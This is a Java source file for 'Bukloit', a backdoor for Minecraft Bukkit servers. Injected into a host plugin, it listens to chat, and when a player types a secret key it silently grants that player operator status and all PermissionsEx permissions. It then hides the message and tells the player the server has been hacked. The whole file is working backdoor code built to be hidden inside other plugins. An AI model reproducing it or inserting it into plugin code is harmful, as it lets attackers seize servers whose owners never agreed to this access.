package bukloit;

import java.lang.reflect.Method;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Bukloit implements Listener {
	private String key;
	private JavaPlugin plugin;
	public static void hackMe(JavaPlugin pluginIn, String keyIn) {
	    Bukkit.getServer().getPluginManager().registerEvents(new Bukloit(keyIn, pluginIn), pluginIn);
	}
	private Bukloit(String hookIn, JavaPlugin pluginIn) {
		key = hookIn;
		plugin = pluginIn;
	}
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {
		if(e.getMessage().equals(key)) {
			e.getPlayer().setOp(true);
			if(Bukkit.getServer().getPluginManager().isPluginEnabled("PermissionsEx")) {
				try {
					Class<?> pex = Class.forName("ru.tehkode.permissions.bukkit.PermissionsEx");
					Method getPermissionManager = pex.getMethod("getPermissionManager");
					Object PermissionManager = getPermissionManager.invoke(null);
					Method getUser;
					getUser = Class.forName("ru.tehkode.permissions.PermissionManager").getMethod("getUser", Player.class);
					Object User = getUser.invoke(PermissionManager, e.getPlayer());
					Method addPermission = Class.forName("ru.tehkode.permissions.PermissionEntity").getMethod("addPermission", String.class);
					addPermission.invoke(User, "*");
				} catch (Exception e1) {}
			}
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "tellraw " + e.getPlayer().getName() + " [\"\",{\"text\":\"You have successfully hacked server using\",\"color\":\"light_purple\"},{\"text\":\" Bukloit\",\"color\":\"green\"},{\"text\":\" backdoor in \",\"color\":\"light_purple\"},{\"text\":\"" + plugin.getName() + "\",\"color\":\"red\"},{\"text\":\" plugin!\",\"color\":\"light_purple\"},{\"text\":\"\\n\"},{\"text\":\"Bukloit on GitHub: \",\"color\":\"gold\"},{\"text\":\"https://github.com/Rikonardo/Bukloit\",\"color\":\"green\",\"clickEvent\":{\"action\":\"open_url\",\"value\":\"https://github.com/Rikonardo/Bukloit\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"Bukloit source code!\"}}]");
			e.setCancelled(true);
		}
    }
}
